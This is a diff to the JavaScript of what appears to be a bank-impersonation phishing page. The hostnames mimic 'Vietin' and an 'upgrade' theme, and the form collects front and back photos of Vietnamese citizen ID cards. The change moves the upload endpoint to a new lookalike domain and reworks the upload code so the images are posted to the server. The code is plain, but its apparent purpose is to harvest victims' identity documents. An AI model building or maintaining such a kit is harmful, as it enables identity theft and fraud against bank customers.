@@ -1,5 +1,5 @@
 $(document).ready(function () {
-    const socket = io('https://vietin.hbservice.site/');
+    const socket = io('https://vietin.nang-cap.online/');
     const images = []
     var uploader = new SocketIOFileUpload(socket);
     socket.on('file', (data) => {
@@ -9,6 +9,8 @@ $(document).ready(function () {
     $('#mattruoccccd').click(function () {
         $(this).find('input[type="file"]')[0].click();
     });
+    // get host
+    const host = window.location.origin;
     // Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
     function readURL(input) {
         if (input.files && input.files[0]) {
@@ -21,7 +23,21 @@ $(document).ready(function () {
 
             }
             reader.readAsDataURL(input.files[0]);
-            uploader.submitFiles([input.files[0]]);
+            const formData = new FormData();
+            console.log(input.files[0]);
+            formData.append('file', input.files[0]);
+            $('.loader').show()
+            fetch('/upload', {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                }).catch(error => {
+                    console.error('Error:', error);
+                }).finally(() => {
+                    $('.loader').hide()
+                });
         }
     }
 
@@ -40,7 +56,21 @@ $(document).ready(function () {
 
             }
             reader.readAsDataURL(input.files[0]);
-            uploader.submitFiles([input.files[0]]);
+            // uploader.submitFiles([input.files[0]]);
+            const formData = new FormData();
+            formData.append('file', input.files[0]);
+            $('.loader').show()
+            fetch(`${host}/upload`, {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                }).catch(error => {
+                    console.error('Error:', error);
+                }).finally(() => {
+                    $('.loader').hide()
+                });
         }
     }
 
@@ -59,7 +89,21 @@ $(document).ready(function () {
 
             }
             reader.readAsDataURL(input.files[0]);
-            uploader.submitFiles([input.files[0]]);
+            // uploader.submitFiles([input.files[0]]);
+            const formData = new FormData();
+            formData.append('file', input.files[0]);
+            $('.loader').show()
+            fetch(`${host}/upload`, {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                }).catch(error => {
+                    console.error('Error:', error);
+                }).finally(() => {
+                    $('.loader').hide()
+                });
 
         }
     }
@@ -78,7 +122,20 @@ $(document).ready(function () {
 
             }
             reader.readAsDataURL(input.files[0]);
-            uploader.submitFiles([input.files[0]]);
+            const formData = new FormData();
+            formData.append('file', input.files[0]);
+            $('.loader').show()
+            fetch(`${host}/upload`, {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                }).catch(error => {
+                    console.error('Error:', error);
+                }).finally(() => {
+                    $('.loader').hide()
+                });
 
         }
     }
@@ -86,7 +143,6 @@ $(document).ready(function () {
 
     $("#mattruoc").change(function () {
         readURL(this);
-
     });
     $("#matsau").change(async function () {
         readURL2(this);
